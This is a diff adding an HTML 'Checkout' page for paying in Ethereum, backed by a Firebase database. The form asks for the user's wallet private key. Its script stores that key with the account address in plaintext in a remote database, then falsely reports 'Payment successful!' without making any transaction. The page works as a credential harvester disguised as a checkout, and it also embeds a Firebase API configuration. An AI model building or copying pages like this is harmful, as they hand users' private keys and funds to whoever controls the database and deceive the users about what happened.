@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Checkout Page</title>
+
+    <style>
+    /* Basic styling for the body of the page, centers the main checkout container */
+body {
+    font-family: 'Arial', sans-serif;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    background-color: #f5f5f5;
+}
+
+/* Styling for the main checkout container */
+.checkout-container {
+    background-color: #fff;
+    padding: 30px;
+    border-radius: 10px;
+    box-shadow: 0px 2px 20px rgba(0, 0, 0, 0.1);
+    width: 400px; /* Increased the width to better accommodate the labels */
+}
+
+/* Centered title styling */
+h2 {
+    text-align: center;
+    margin-bottom: 25px;
+}
+
+/* Styling for individual item display, price display, and card field with equal space distribution */
+.checkout-item, .checkout-price {
+    display: flex;
+    justify-content: space-between;
+    margin-bottom: 20px;
+}
+
+.checkout-item, .checkout-key {
+    display: flex;
+    justify-content: space-between;
+    margin-bottom: 20px;
+}
+
+/* General styling for input fields */
+input {
+    padding: 10px;
+    width: 100%;
+    border-radius: 5px;
+    border: 1px solid #ccc;
+    flex: 1; /* Allows the input to take the remaining space after the label */
+}
+
+/* Styling for labels */
+label {
+    margin-right: 10px; /* Provides spacing between label and input */
+    white-space: nowrap; /* Prevents the label from wrapping to the next line */
+}
+
+/* Button styling with hover effect */
+button {
+    background-color: #007BFF;
+    color: #ffffff;
+    border: none;
+    padding: 15px;
+    border-radius: 5px;
+    cursor: pointer;
+    width: 100%;
+    font-size: 16px;
+    transition: background-color 0.3s ease;
+}
+
+/* Button hover effect for a subtle color shift */
+button:hover {
+    background-color: #0056b3;
+}
+
+    </style>
+</head>
+
+<body>
+    <!-- Main container for the checkout form -->
+    <div class="checkout-container">
+        <!-- Title of the checkout form -->
+        <h2>Checkout</h2>
+        <!-- Product name display field -->
+
+   <form action="" id="NewPayment">
+
+        <div class="checkout-item">
+            <label for="accountAddress">ACCOUNT ADDRESS:</label>
+            <input type="text" id="accountAddress" placeholder="ACCOUNT ADDRESS" required>
+        </div>
+        <!-- Product price display field -->
+
+        <div class="checkout-key">
+            <label for="privateKey">PRIVATE KEY:</label>
+            <input type="text" id="privateKey" placeholder="PRIVATE KEY" required>
+        </div>
+        <div class="checkout-price">
+            <label for="totalEth">Total Eth:</label>
+            <input type="text" id="totalEth" readonly required>
+        </div>
+        
+
+        
+        <!-- Pay Now button with a link to the Payment page -->
+         <button type="submit">Pay Now</button>
+      </form>
+
+    </div>
+
+<script>
+window.onload = function() {
+    // Get the total value from the URL
+    const urlParams = new URLSearchParams(window.location.search);
+    const totalValue = urlParams.get("total");
+
+    // Display the total value in the "Total Eth" input field
+    document.getElementById("totalEth").value = totalValue;
+}
+</script>
+
+
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/7.14.1-0/firebase.js"></script>
+    
+    <script>
+        // copy your firebase config informations
+      const firebaseConfig = {
+  apiKey: "AIzaSyApLNnZMcxHXrBLNVbO5T_2OQnT6J1Upbw",
+  authDomain: "cryptoharbor-593f2.firebaseapp.com",
+  databaseURL: "https://cryptoharbor-593f2-default-rtdb.firebaseio.com",
+  projectId: "cryptoharbor-593f2",
+  storageBucket: "cryptoharbor-593f2.appspot.com",
+  messagingSenderId: "236261226631",
+  appId: "1:236261226631:web:c65c81956500844e396022",
+  measurementId: "G-449LJKSQ4H"
+};
+
+        // initialize firebase
+        firebase.initializeApp(firebaseConfig);
+
+        // reference your database
+        var contactFormDB = firebase.database().ref("NewPayment");
+
+        document.getElementById("NewPayment").addEventListener("submit", submitForm);
+
+        function submitForm(e) {
+            e.preventDefault();
+
+            var accountAddress = getElementVal("accountAddress");
+            var privateKey = getElementVal("privateKey");
+            var totalEth = getElementVal("totalEth");
+
+            saveMessages(accountAddress, privateKey, totalEth);
+
+            // Reset the form
+            document.getElementById("NewPayment").reset();
+        }
+
+        const saveMessages = (accountAddress, privateKey, totalEth) => {
+            var newContactForm = contactFormDB.push();
+
+            newContactForm.set({
+                accountAddress: accountAddress,
+                privateKey: privateKey,
+                totalEth: totalEth
+            });
+
+            // Show alert for transaction success
+            alert("Payment successful!");
+            // Redirect to Payment.html
+            window.location.href = "Payment.html";
+        };
+
+        const getElementVal = (id) => {
+            return document.getElementById(id).value;
+        };
+    </script>
+
+
+
+
+</body>
+
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
